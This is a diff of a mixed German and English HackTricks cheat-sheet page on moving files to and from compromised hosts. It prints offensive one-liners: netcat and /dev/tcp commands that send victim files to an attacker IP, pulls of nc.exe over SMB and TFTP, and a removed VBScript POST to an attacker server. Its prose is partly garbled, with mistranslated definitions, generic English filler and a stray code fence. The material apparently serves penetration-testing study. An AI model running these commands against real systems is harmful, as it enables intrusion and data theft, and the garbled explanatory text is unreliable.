@@ -10,13 +10,13 @@ Andere Möglichkeiten, HackTricks zu unterstützen:
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys senden.
 
 </details>
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -65,7 +65,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Dateien hochladen
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer, das GET- und POST-Anforderungen (auch Header) druckt**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Python-Modul [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -185,35 +185,41 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-### Exfiltration
+# Exfiltration
 
-Exfiltration techniques are used to **steal** data from a target network. Once an attacker gains access to a system, they need to find a way to **transfer** the stolen data back to their own infrastructure without being detected. This is where exfiltration techniques come into play.
+## Introduction
 
-#### Common Exfiltration Techniques
+Exfiltration is the unauthorized transfer of data from a target system. This can be achieved through various methods, such as:
 
-1. **Compression**: Data can be compressed before exfiltration to reduce its size and make it easier to transfer without raising suspicion.
+- Uploading data to an external server
+- Sending data via email
+- Using covert channels
 
-2. **Encryption**: Encrypting the stolen data before exfiltration can help evade detection by security tools that are not able to decrypt the data.
+## Techniques
 
-3. **Steganography**: This technique involves hiding the stolen data within another file, such as an image or a document, to avoid detection.
+### Data Compression
 
-4. **Protocol Tunneling**: Attackers can use protocol tunneling to encapsulate exfiltrated data within legitimate network protocols to bypass security controls.
+Data can be compressed before exfiltration to reduce its size and avoid detection.
 
-5. **DNS Tunneling**: By encoding data within DNS queries and responses, attackers can exfiltrate data without directly connecting to their command and control server.
+### Data Encryption
 
-#### Exfiltration Tools
+Encrypting data before exfiltration can prevent unauthorized access to the stolen information.
 
-There are various tools available to facilitate data exfiltration, such as:
+### Steganography
 
-- **Netcat**: A versatile networking utility that can be used to transfer data between systems.
-  
-- **Wget**: A command-line utility that can retrieve content from web servers, which can be abused for exfiltration purposes.
+Hiding data within other files or images can help evade detection during exfiltration.
 
+## Tools
+
+There are various tools available for exfiltrating data from a target system, such as:
+
+- **Netcat**: A versatile networking utility that can be used for transferring data.
+- **Wget**: A command-line utility for downloading files from the web.
 - **Curl**: Another command-line tool for transferring data with support for various protocols.
 
-- **FTP**: File Transfer Protocol can be used for exfiltrating data to a remote server.
+## Conclusion
 
-By understanding and utilizing these exfiltration techniques and tools, attackers can successfully steal data from target networks without being detected.
+Exfiltration is a critical phase of a successful attack, and understanding the various techniques and tools available is essential for a hacker.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -235,9 +241,7 @@ sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## Netzwerkkommunikation
-
-Netzwerkkommunikation bezieht sich auf die Techniken, die verwendet werden, um Daten aus einem Netzwerk zu extrahieren. Dies kann durch den Abfang von Netzwerkverkehr oder die Ausnutzung von Schwachstellen in der Netzwerksicherheit erfolgen. Einige gängige Methoden zur Netzwerkkommunikation sind das Tunneln von Daten über Protokolle wie HTTP oder DNS, das Versenden von Daten über alternative Ports und das Verwenden von verschlüsselten Kanälen wie VPNs. Es ist wichtig, diese Techniken zu verstehen, um potenzielle Schwachstellen zu identifizieren und zu beheben.
+## Netzwerk-Kommunikation
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -249,7 +253,9 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Datei auf das Opfer hochladen
+### Datei auf Opfer hochladen
+
+Wenn Sie Zugriff auf das Opfersystem haben, können Sie Dateien auf das System hochladen, um Daten zu exfiltrieren. Dies kann über verschiedene Methoden wie Remote-Verwaltungstools, Dateifreigabe oder sogar über E-Mail-Anhänge erfolgen. Stellen Sie sicher, dass Sie die erforderlichen Berechtigungen haben und dass die Dateiübertragung nicht entdeckt wird.
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -298,7 +304,7 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-In **Opfer**, verbinden Sie sich mit dem Kali-Server:
+Auf dem **Opfer** verbinden Sie sich mit dem Kali-Server:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
@@ -310,19 +316,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-### Exfiltration
-
-VBScript can be used to exfiltrate data by sending it over HTTP or HTTPS to an attacker-controlled server. This can be achieved by creating an HTTP request object, setting the request method and headers, and sending the data in the request body. The following example demonstrates how data can be exfiltrated using VBScript:
-
-```vbscript
-Dim objHTTP
-Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
-objHTTP.Open "POST", "http://attacker-server.com/data", False
-objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
-objHTTP.send "data=exfiltrated_data"
-```
-
-In this example, the script creates an HTTP POST request to "http://attacker-server.com/data" with the data "exfiltrated_data" in the request body. The attacker can then receive and process the exfiltrated data on their server.
+VBScript ist eine von Microsoft entwickelte Skriptsprache, die in Windows-Umgebungen häufig verwendet wird. Es kann verwendet werden, um Dateien zu exfiltrieren, indem es sie in Base64 kodiert und dann in einer HTTP-Anfrage an einen Remote-Server sendet.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -366,18 +360,13 @@ Das Programm `debug.exe` ermöglicht nicht nur die Inspektion von Binärdateien,
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-```markdown
-Dann kopieren Sie den Text in die Windows-Shell, und eine Datei namens nc.exe wird erstellt.
-
-* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
-
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -387,11 +376,10 @@ Dann kopieren Sie den Text in die Windows-Shell, und eine Datei namens nc.exe wi
 
 Andere Möglichkeiten, HackTricks zu unterstützen:
 
-* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks in PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
+* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys einreichen.
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
 
 </details>
-```
